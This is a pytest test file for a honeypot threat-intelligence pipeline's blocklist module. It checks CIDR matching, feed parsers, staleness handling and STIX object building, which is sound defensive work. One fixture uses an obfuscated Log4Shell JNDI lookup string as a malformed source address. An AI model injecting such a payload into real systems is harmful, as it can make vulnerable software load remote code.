"""blocklists — free bulk-list matching (Lane A)."""
from __future__ import annotations

import ipaddress
import json
import sqlite3
from types import SimpleNamespace

import pytest

from tpot2cti.enrich import blocklists as bl
from tpot2cti.enrich import sources as src
from tpot2cti.httpfetch import FetchResult, Outcome
from tpot2cti.stix_ids import attacker_ip_observable_id


def _fr(status, body):
    return FetchResult(Outcome.OK if status == 200 else Outcome.UNAVAILABLE,
                       status, body)


# ── CIDR matching ────────────────────────────────────────────────────────

def _cs(*cidrs):
    return src.CidrSet([ipaddress.ip_network(c) for c in cidrs])


def test_cidrset_matches_inside_and_rejects_outside():
    s = _cs("45.9.0.0/16", "203.0.113.7/32")
    assert ipaddress.ip_address("45.9.1.2") in s
    assert ipaddress.ip_address("203.0.113.7") in s
    assert ipaddress.ip_address("8.8.8.8") not in s


def test_cidrset_handles_networks_shorter_than_the_bucket():
    """Bucketing by first octet is only correct if a network spanning several
    octets is registered in every one of them — otherwise a /3 silently matches
    just 1/32nd of its range."""
    s = _cs("224.0.0.0/3")           # 224.0.0.0 – 255.255.255.255
    for ip in ("224.0.0.1", "240.1.2.3", "255.255.255.254"):
        assert ipaddress.ip_address(ip) in s, f"{ip} missed by bucketing"
    assert ipaddress.ip_address("223.255.255.255") not in s


def test_cidrset_ignores_ipv6():
    s = _cs("45.9.0.0/16")
    assert ipaddress.ip_address("2001:db8::1") not in s


# ── parsers ──────────────────────────────────────────────────────────────

def test_netset_parser_handles_both_comment_styles_and_trailing_data():
    """FireHOL comments with '#', Spamhaus with ';' AND appends '; SBL…' after
    the CIDR. A parser that only knows one of these silently drops a feed."""
    text = (
        "# firehol comment\n"
        "; spamhaus comment\n"
        "45.9.0.0/16\n"
        "203.0.113.0/24 ; SBL123456\n"
        "\n"
        "not-an-address\n"
    )
    cidrs, _ = src._parse_netset(text)
    assert len(cidrs) == 2
    assert ipaddress.ip_address("203.0.113.9") in cidrs


def test_feodo_parser_matches_ONLY_online_c2s():
    """Feodo retains long-dead infrastructure — 4 of its 5 entries were offline
    when this was written. Publishing a decommissioned host as an active C2,
    attached to a Malware SDO, is the unqualified-claim class of mistake that
    got the predecessor's abuse.ch key banned."""
    text = json.dumps([
        {"ip_address": "45.9.1.2", "status": "online", "malware": "QakBot"},
        {"ip_address": "45.9.9.9", "status": "offline", "malware": "Emotet"},
    ])
    cidrs, extra = src._parse_feodo(text)
    assert ipaddress.ip_address("45.9.1.2") in cidrs
    assert ipaddress.ip_address("45.9.9.9") not in cidrs, "published an OFFLINE C2"
    assert extra["families"] == {"45.9.1.2": "QakBot"}


def test_feodo_parser_raises_on_a_shape_change():
    with pytest.raises(src.SourceParseError):
        src._parse_feodo("<html>rate limited</html>")
    with pytest.raises(src.SourceParseError):
        src._parse_feodo('{"not":"a list"}')


def test_unknown_source_name_is_rejected_loudly():
    """A typo in ENRICH_BLOCKLIST_SOURCES silently disabling a feed is a
    configuration-shaped silent-zero-work bug."""
    with pytest.raises(ValueError, match="firehol"):
        src.selected_sources("firehol,typo-here")
    assert [s.key for s in src.selected_sources("firehol,tor")] == ["firehol", "tor"]


# ── fetch guards ─────────────────────────────────────────────────────────

def test_a_short_parse_is_refused_rather_than_un_labelling_the_world(monkeypatch):
    """These feeds are plain text over HTTP: a captive portal or rate-limit
    page parses to zero networks perfectly happily. Accepting that would make
    a broken fetch look like a clean internet."""
    monkeypatch.setattr(bl, "http_fetch",
                        lambda url, timeout=None: _fr(200, b"<html>429 Too Many Requests</html>"))
    with pytest.raises(src.SourceParseError, match="below the floor"):
        bl.fetch_source(src.SOURCES_BY_KEY["firehol"])


def test_a_refusal_is_not_reported_as_an_empty_list(monkeypatch):
    """The distinction the shared fetch helper exists for: a 403 must surface
    as a refusal, never as "the source returned nothing". Shodan's InternetDB
    really does 403 Python's default User-Agent."""
    from tpot2cti.httpfetch import FetchResult, Outcome
    monkeypatch.setattr(bl, "http_fetch",
                        lambda url, timeout=None: FetchResult(Outcome.REFUSED, 403))
    with pytest.raises(src.SourceParseError, match="refused"):
        bl.fetch_source(src.SOURCES_BY_KEY["firehol"])


def test_one_source_failing_does_not_take_down_the_others(monkeypatch, state_db):
    good = "45.9.0.0/16\n" + "\n".join(f"10.{i}.0.0/16" for i in range(1100))
    def fake(source, timeout=None):
        if source.key == "firehol":
            raise src.SourceParseError("simulated")
        return src._parse_netset(good)
    monkeypatch.setattr(bl, "fetch_source", fake)
    out, failed = bl.refresh_lists(list(src.SOURCES[:3]), state_db)
    assert failed == ["firehol"]
    assert "firehol" not in out
    assert "spamhaus" in out and "tor" in out


def test_a_failed_source_keeps_its_previous_copy(monkeypatch, state_db):
    """One flaky feed must not silently remove a whole dimension of matching.
    An earlier version returned only successes and the caller merged with
    `or lists`, which replaced the dict wholesale — so a single transient
    failure dropped that source's good data entirely."""
    good = "45.9.0.0/16\n" + "\n".join(f"10.{i}.0.0/16" for i in range(1100))
    calls = {"n": 0}
    def flaky(source, timeout=None):
        calls["n"] += 1
        if source.key == "firehol" and calls["n"] > 1:
            raise src.SourceParseError("simulated outage")
        return src._parse_netset(good)
    monkeypatch.setattr(bl, "fetch_source", flaky)
    first, _ = bl.refresh_lists([src.SOURCES_BY_KEY["firehol"]], state_db)
    assert "firehol" in first
    second, failed = bl.refresh_lists([src.SOURCES_BY_KEY["firehol"]], state_db,
                                      previous=first)
    assert failed == ["firehol"]
    assert "firehol" in second, "a transient failure deleted a good list"
    assert second["firehol"] is first["firehol"]


# ── staleness: this lane's whole health question ─────────────────────────

def _seed_core_db(path, rows):
    conn = sqlite3.connect(path)
    conn.execute("""CREATE TABLE attacker_activity (
        src_ip TEXT, parser TEXT, sensor TEXT, sessions_count INT,
        events_count INT, auth_success_count INT, credentials_count INT,
        commands_count INT, malware_drop_count INT, first_seen TEXT,
        last_seen TEXT, sample_dst_ports_json TEXT,
        PRIMARY KEY (src_ip, parser, sensor))""")
    conn.executemany(
        "INSERT INTO attacker_activity (src_ip,parser,sensor,sessions_count,"
        "events_count,auth_success_count,credentials_count,commands_count,"
        "malware_drop_count,first_seen,last_seen,sample_dst_ports_json) "
        "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)", rows)
    conn.commit(); conn.close()


class _Pub:
    def __init__(self, ok=True):
        self._ok, self.objects = ok, None
    def publish(self, objects, cycle_id=None):
        self.objects = objects
        return SimpleNamespace(cycle_id=str(cycle_id), pass_counts={},
                               errors=[] if self._ok else ["simulated"])


def _core(tmp_path, ips):
    from datetime import datetime, timezone
    now = datetime.now(timezone.utc).isoformat()
    db = str(tmp_path / "core.db")
    _seed_core_db(db, [(ip, "Cowrie", "s1", 1, 1, 0, 0, 0, 0, now, now, None)
                       for ip in ips])
    return db


def _lists(state_db, key="firehol", cidrs=("45.9.0.0/16",), age_iso=None):
    from datetime import datetime, timezone
    when = age_iso or datetime.now(timezone.utc).isoformat()
    state_db.set(f"bl_fetched_at:{key}", when)
    return {key: {"cidrs": _cs(*cidrs), "extra": {},
                  "fetched_at": when, "fresh": True}}


def test_a_stale_list_fails_the_cycle_instead_of_matching_anyway(cfg, state_db, tmp_path):
    """Matching against a frozen list is a confident answer built on expired
    evidence, and once it reaches the graph it is indistinguishable from a
    fresh one. Refusing is right — but it is NOT a successful cycle, or a
    runner that stopped refreshing months ago reads perfectly healthy."""
    from datetime import datetime, timedelta, timezone
    from tpot2cti.stix.builder import STIXBuilder
    old = (datetime.now(timezone.utc) - timedelta(hours=bl.MAX_LIST_AGE_HOURS + 5)).isoformat()
    lists = _lists(state_db, age_iso=old)
    db = _core(tmp_path, ["45.9.1.2"])
    pub = _Pub()
    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), pub,
                     lists, src.SOURCES_BY_KEY)
    assert s["stale"] is True and s["publish_ok"] is False
    assert pub.objects is None
    assert not state_db.recent_cycles(1)[0]["success"], \
        "a fully stale runner recorded a SUCCESSFUL cycle"


def test_a_read_failure_fails_the_cycle(cfg, state_db, tmp_path):
    from tpot2cti.stix.builder import STIXBuilder
    lists = _lists(state_db)
    s = bl.run_cycle(cfg, state_db, str(tmp_path / "gone.db"),
                     lambda: STIXBuilder(cfg), _Pub(), lists, src.SOURCES_BY_KEY)
    assert s["publish_ok"] is False and "read_error" in s
    assert not state_db.recent_cycles(1)[0]["success"]


# ── build + cycle ────────────────────────────────────────────────────────

def test_labels_land_on_the_observable_core_already_created(builder):
    objs = bl.build_objects(builder, "45.9.1.2", [("firehol", {})], src.SOURCES_BY_KEY)
    assert objs[0]["id"] == attacker_ip_observable_id("45.9.1.2")
    assert "blocklist:firehol-level1" in objs[0]["x_opencti_labels"]


def test_a_feodo_online_c2_promotes_to_a_malware_sdo_WITH_an_edge(builder):
    """Never emit a floating SDO: the predecessor created ~1,600 edgeless
    Spamhaus Indicators, which are unqueryable clutter — worse than a label."""
    objs = bl.build_objects(builder, "45.9.1.2",
                            [("feodo", {"families": {"45.9.1.2": "QakBot"}})],
                            src.SOURCES_BY_KEY)
    kinds = [o["type"] for o in objs]
    assert "malware" in kinds and "relationship" in kinds
    rel = next(o for o in objs if o["type"] == "relationship")
    mal = next(o for o in objs if o["type"] == "malware")
    assert rel["source_ref"] == attacker_ip_observable_id("45.9.1.2")
    assert rel["target_ref"] == mal["id"]


def test_a_feodo_hit_without_a_named_family_labels_but_does_not_promote(builder):
    objs = bl.build_objects(builder, "45.9.1.2", [("feodo", {"families": {}})],
                            src.SOURCES_BY_KEY)
    assert [o["type"] for o in objs] == ["ipv4-addr"]


def test_cycle_matches_labels_and_skips_repeats(cfg, state_db, tmp_path):
    from tpot2cti.stix.builder import STIXBuilder
    lists = _lists(state_db)
    db = _core(tmp_path, ["45.9.1.2", "8.8.8.8"])
    first = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                         lists, src.SOURCES_BY_KEY)
    assert first["matched"] == 1 and first["per_source"] == {"firehol": 1}

    second = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                          lists, src.SOURCES_BY_KEY)
    assert second["matched"] == 0 and second["already"] == 1


def test_marks_are_recorded_only_after_a_confirmed_publish(cfg, state_db, tmp_path):
    from tpot2cti.stix.builder import STIXBuilder
    lists = _lists(state_db)
    db = _core(tmp_path, ["45.9.1.2"])
    bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(ok=False),
                 lists, src.SOURCES_BY_KEY)
    assert state_db.get("bl:45.9.1.2:firehol") is None
    retry = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(ok=True),
                         lists, src.SOURCES_BY_KEY)
    assert retry["matched"] == 1, "must retry after a failed publish"


def test_an_ip_can_gain_a_second_list_later(cfg, state_db, tmp_path):
    """Per-(ip, source) marks, like noisefloor's per-(ip, label) cache: an
    address already marked for one list must still be able to earn another."""
    from tpot2cti.stix.builder import STIXBuilder
    db = _core(tmp_path, ["45.9.1.2"])
    one = _lists(state_db, "firehol")
    assert bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                        one, src.SOURCES_BY_KEY)["matched"] == 1
    both = dict(one, **_lists(state_db, "tor"))
    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                     both, src.SOURCES_BY_KEY)
    assert s["per_source"] == {"tor": 1}, "second list lost to the skip-cache"


def test_a_list_with_no_recorded_fetch_time_is_treated_as_stale(cfg, state_db, tmp_path):
    """Unknown age must fail closed. Reading a missing timestamp as "zero hours
    old" is the safe-looking default that silently converts an unknown into a
    confident answer."""
    from tpot2cti.stix.builder import STIXBuilder
    lists = {"firehol": {"cidrs": _cs("45.9.0.0/16"), "extra": {},
                         "fetched_at": None, "fresh": True}}
    state_db.set("bl_fetched_at:firehol", "not-a-timestamp")
    db = _core(tmp_path, ["45.9.1.2"])
    pub = _Pub()
    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), pub,
                     lists, src.SOURCES_BY_KEY)
    assert s["stale"] is True and s["publish_ok"] is False
    assert pub.objects is None


def test_cidrset_agrees_with_brute_force_including_at_boundaries():
    """The bucketed matcher's dangerous failure is a false NEGATIVE: a listed
    address silently not matching, which under-labels forever and shows up
    nowhere. Cross-check against the obvious-but-slow implementation on a mix
    of random addresses and the exact edges of every network — off-by-one at a
    network boundary is the bug a hand-written sample would miss.

    Verified separately against the real downloaded FireHOL / Spamhaus / Tor
    lists (4,584 / 1,665 / 1,401 networks, 248k checks): exact agreement.
    """
    import random
    rng = random.Random(20260805)
    nets = [ipaddress.ip_network(n) for n in (
        "224.0.0.0/3", "10.0.0.0/8", "45.9.0.0/16", "203.0.113.0/24",
        "198.51.100.7/32", "172.16.0.0/12", "0.0.0.0/8",
    )]
    cs = src.CidrSet(nets)
    brute = lambda ip: any(ip in n for n in nets)

    probes = [ipaddress.ip_address(rng.randrange(2**32)) for _ in range(4000)]
    for n in nets:                       # exact edges, ±1
        f, l = int(n.network_address), int(n.broadcast_address)
        probes += [ipaddress.ip_address(v) for v in (f - 1, f, f + 1, l - 1, l, l + 1)
                   if 0 <= v < 2**32]
    for ip in probes:
        assert (ip in cs) is brute(ip), f"disagreement at {ip}"


def test_a_second_ip_sharing_a_family_KEEPS_its_edge(builder):
    """The builder dedups a Malware SDO already emitted this cycle, returning
    None. Dropping the relationship alongside it would silently orphan every
    address after the first — the same shape as the first-matching-label bug,
    and invisible in both the counters and the cycle log."""
    hit = [("feodo", {"families": {"45.9.1.2": "QakBot", "45.9.3.4": "QakBot"}})]
    first = bl.build_objects(builder, "45.9.1.2", hit, src.SOURCES_BY_KEY)
    second = bl.build_objects(builder, "45.9.3.4", hit, src.SOURCES_BY_KEY)

    assert "malware" in [o["type"] for o in first]
    assert "malware" not in [o["type"] for o in second], "expected SDO dedup"
    rels = [o for o in second if o["type"] == "relationship"]
    assert len(rels) == 1, "second address lost its edge to the deduped SDO"
    assert rels[0]["source_ref"] == attacker_ip_observable_id("45.9.3.4")
    assert rels[0]["target_ref"] == next(
        o["id"] for o in first if o["type"] == "malware")


def test_a_feodo_malware_sdo_does_not_claim_a_captured_sample(builder):
    """This is the highest-confidence object the module emits, in a project
    whose predecessor had a key banned for unqualified claims. It came from a
    downloaded list, and must not assert first-party capture."""
    objs = bl.build_objects(builder, "45.9.1.2",
                            [("feodo", {"families": {"45.9.1.2": "QakBot"}})],
                            src.SOURCES_BY_KEY)
    mal = next(o for o in objs if o["type"] == "malware")
    assert "honeypot-captured" not in mal["description"]
    assert "Feodo" in mal["description"] and "NOT from a captured sample" in mal["description"]


def test_observables_carry_no_description_that_could_clobber_core(builder):
    """Labels-only, matching noisefloor. The publisher sends update=False, and
    a later second-list hit would rewrite the text to name only the newer
    source — losing the first either way."""
    objs = bl.build_objects(builder, "45.9.1.2", [("firehol", {})], src.SOURCES_BY_KEY)
    assert "x_opencti_description" not in objs[0]


def test_unparseable_src_ip_is_counted_not_silently_dropped(cfg, state_db, tmp_path):
    """CORE's live window holds 16 rows whose src_ip is an obfuscated Log4Shell
    JNDI payload, not an address. Without a counter they are indistinguishable
    from "matched no list"."""
    from tpot2cti.stix.builder import STIXBuilder
    lists = _lists(state_db)
    db = _core(tmp_path, ["${${lower:j}ndi:ldap://x/a}", "45.9.1.2"])
    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                     lists, src.SOURCES_BY_KEY)
    assert s["malformed"] == 1 and s["matched"] == 1


def test_a_parser_raising_something_unexpected_stays_isolated(monkeypatch, state_db):
    """fetch_source promises per-source isolation. A parser raising anything
    other than SourceParseError would escape refresh_lists' handler and take
    down the other three feeds — one bad field in the smallest source."""
    boom = src.Source(key="feodo", url="http://x", label="l",
                      parse=lambda body: (_ for _ in ()).throw(TypeError("renamed field")),
                      meaning="m", min_entries=0)
    monkeypatch.setattr(bl, "http_fetch", lambda url, timeout=None: _fr(200, b"[]"))
    with pytest.raises(src.SourceParseError, match="TypeError"):
        bl.fetch_source(boom)


def test_feodo_detects_a_renamed_field_instead_of_reporting_zero_c2s(monkeypatch):
    """min_entries=0 cannot catch this: the feed legitimately can be near-empty,
    so a renamed key yields zero online C2s and passes as a clean result."""
    with pytest.raises(src.SourceParseError, match="schema has changed"):
        src._parse_feodo(json.dumps([{"ipAddress": "45.9.1.2", "state": "online"}]))


def test_a_future_timestamp_is_not_infinitely_fresh(state_db):
    """A negative age would sail past the staleness cliff forever — an unknown
    silently becoming the most confident possible answer."""
    from datetime import datetime, timedelta, timezone
    future = (datetime.now(timezone.utc) + timedelta(hours=48)).isoformat()
    state_db.set("bl_fetched_at:firehol", future)
    assert bl.age_hours(state_db, "firehol") is None


def test_a_family_failing_the_quality_gate_yields_NEITHER_sdo_NOR_edge(builder):
    """Building the edge from a re-derived malware id is only safe if it can
    never disagree with the builder. A family the gate rejects must produce
    nothing at all — an edge to an SDO that was never emitted is a dangling
    reference, which is worse than a missing one."""
    # A distinct address per case: the builder dedups an observable it already
    # emitted this cycle, so reusing one IP would mask the assertion.
    for n, junk in enumerate(("generic", "trojan", "gen42", "malware"), start=1):
        ip = f"45.9.1.{n}"
        objs = bl.build_objects(builder, ip, [("feodo", {"families": {ip: junk}})],
                                src.SOURCES_BY_KEY)
        kinds = [o["type"] for o in objs]
        assert kinds == ["ipv4-addr"], f"{junk!r} produced {kinds}"


def test_the_edge_target_matches_the_builders_own_malware_id(builder):
    """Pin the derivation itself: blocklists computes the target id separately
    from build_malware, so the two must agree by construction."""
    from tpot2cti.stix.builder import normalize_malware_family
    from tpot2cti.stix_ids import generate_malware_id
    objs = bl.build_objects(builder, "45.9.1.2",
                            [("feodo", {"families": {"45.9.1.2": "QakBot"}})],
                            src.SOURCES_BY_KEY)
    mal = next(o for o in objs if o["type"] == "malware")
    rel = next(o for o in objs if o["type"] == "relationship")
    assert rel["target_ref"] == mal["id"]
    assert mal["id"] == generate_malware_id(normalize_malware_family("QakBot"))


# ── the retry working set ────────────────────────────────────────────────

def _age(state_db, key, hours):
    from datetime import datetime, timedelta, timezone
    state_db.set(f"bl_fetched_at:{key}",
                 (datetime.now(timezone.utc) - timedelta(hours=hours)).isoformat())


def test_a_permanently_failing_source_does_not_starve_the_others(state_db):
    """Retrying ONLY the failures collapses the working set to the broken
    source and never expands back — so the other feeds never refresh again and
    age past the 72h staleness cliff. Simulated at defaults with FireHOL
    failing permanently, every source was stale and every cycle failed by day
    10: one dead URL taking out the whole lane. This is the regression that no
    test caught when the retry-only-failed change was introduced."""
    srcs = list(src.SOURCES)
    refresh_every = 24 * 3600.0
    for s in srcs:
        _age(state_db, s.key, 0.1)          # all just refreshed

    # firehol keeps failing; the others are still fresh, so only it retries
    due = bl.sources_due(srcs, state_db, ["firehol"], refresh_every)
    assert [s.key for s in due] == ["firehol"]

    # a day later the others are due on their own age and MUST come back
    for s in srcs:
        if s.key != "firehol":
            _age(state_db, s.key, 25)
    due = bl.sources_due(srcs, state_db, ["firehol"], refresh_every)
    assert {s.key for s in due} == {s.key for s in srcs}, \
        "healthy sources were starved by a permanently failing one"


def test_sources_with_no_timestamp_are_always_due(state_db):
    due = bl.sources_due(list(src.SOURCES), state_db, [], 24 * 3600.0)
    assert len(due) == len(src.SOURCES)


def test_a_description_override_still_keeps_sample_provenance(builder):
    """The override branch used to return early, silently dropping sha256 and
    detection ratio for any future caller passing both."""
    mal = builder.build_malware("QakBot", description="From a downloaded list.",
                                sample_sha256="a" * 64, detection_ratio="40/70")
    assert "From a downloaded list." in mal["description"]
    assert "aaaaaaaa" in mal["description"] and "40/70" in mal["description"]


# ── a refused source must not hide behind a usable previous copy ─────────

def test_a_refused_source_is_visible_before_the_staleness_cliff(cfg, state_db, tmp_path):
    """The blind window. A source can 403 for up to MAX_LIST_AGE_HOURS while
    its previous copy is still inside the bound — during which the matching
    is legitimate, so the cycle correctly records success. But `failed` was
    logged and dropped: never passed to run_cycle, never in the summary,
    never in record_cycle, never reaching /health. FireHOL carries 5.8 of
    the 6.2 coverage points, so that window sat on the highest-value
    source."""
    from tpot2cti.stix.builder import STIXBuilder
    lists = _lists(state_db)                       # fresh previous copy
    db = _core(tmp_path, ["45.9.1.2"])
    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                     lists, src.SOURCES_BY_KEY, failed=["firehol"])

    assert s["failed_sources"] == ["firehol"], \
        "a refused source is absent from the cycle summary"
    assert state_db.get("bl_failed_sources") == "firehol", \
        "a refused source is absent from state, so /health cannot see it"
    row = state_db.recent_cycles(1)[0]
    assert row["errors_count"] >= 1, \
        "a refused source recorded zero errors — the cycle reads perfectly clean"


def test_a_clean_cycle_still_reports_no_failures(cfg, state_db, tmp_path):
    """Positive control: the assertions above must not pass by the summary
    key simply always being non-empty."""
    from tpot2cti.stix.builder import STIXBuilder
    lists = _lists(state_db)
    db = _core(tmp_path, ["45.9.1.2"])
    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
                     lists, src.SOURCES_BY_KEY)
    assert s["failed_sources"] == []
    assert state_db.recent_cycles(1)[0]["errors_count"] == 0


def test_a_truncated_download_does_not_take_down_the_whole_cycle(monkeypatch, state_db):
    """refresh_lists documents per-source isolation. IncompleteRead escaped
    fetch() as an unclassified exception, blew past `except SourceParseError`
    and killed every remaining source in the round."""
    import http.client
    from tpot2cti.httpfetch import fetch as real_fetch

    def _boom(url, timeout=None):
        return real_fetch(url, timeout=timeout,
                          opener=lambda req, timeout=None: (_ for _ in ()).throw(
                              http.client.IncompleteRead(b"12345", 995)))
    monkeypatch.setattr(bl, "http_fetch", _boom)

    out, failed = bl.refresh_lists(list(src.SOURCES[:2]), state_db)
    assert len(failed) == 2, "isolation broke — the exception escaped the loop"
